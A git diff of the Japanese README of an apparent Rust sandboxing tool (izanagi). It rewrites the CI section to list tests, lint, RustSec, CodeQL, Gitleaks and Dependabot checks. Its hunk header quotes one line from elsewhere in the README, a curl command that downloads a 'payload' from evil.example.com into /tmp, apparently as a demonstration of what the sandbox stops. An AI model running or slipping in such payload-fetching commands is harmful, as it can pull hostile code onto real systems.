@@ -584,11 +584,12 @@ $ curl -s --max-time 3 http://evil.example.com/payload -o /tmp/payload
 
 GitHub Actions で Linux (ubuntu-latest) と macOS (macos-latest) の CI を実行。
 
-- **build-and-test**: 両プラットフォームで cargo build + cargo test（Linux は `--features landlock,ebpf`）
-- **clippy**: 警告をエラー扱いで lint（Linux は `--features landlock,ebpf`）
-- **fmt**: cargo fmt --check
-- **audit**: cargo-audit による依存クレートの脆弱性チェック
-- **build-agent**: izanagi-agent の Linux バイナリ (musl/glibc × aarch64/x86_64)
+- **test**: Linux・macOS で本体をテスト（Linux は `--features landlock,ebpf`）
+- **component-tests**: agent、DNS proxy、HTTP capture、common crate を個別にテスト
+- **quality**: rustfmt と Clippy による静的チェック
+- **dependency-review / RustSec**: PRで追加される脆弱な依存関係と既存のRust依存関係を検査
+- **CodeQL / Gitleaks**: Rustコードの脆弱性とコミット内のシークレットを検査
+- **Dependabot**: Cargo依存関係とGitHub Actionsを週次更新
 - Rust バージョンは `1.93.1` に固定
 
 ## ライセンス
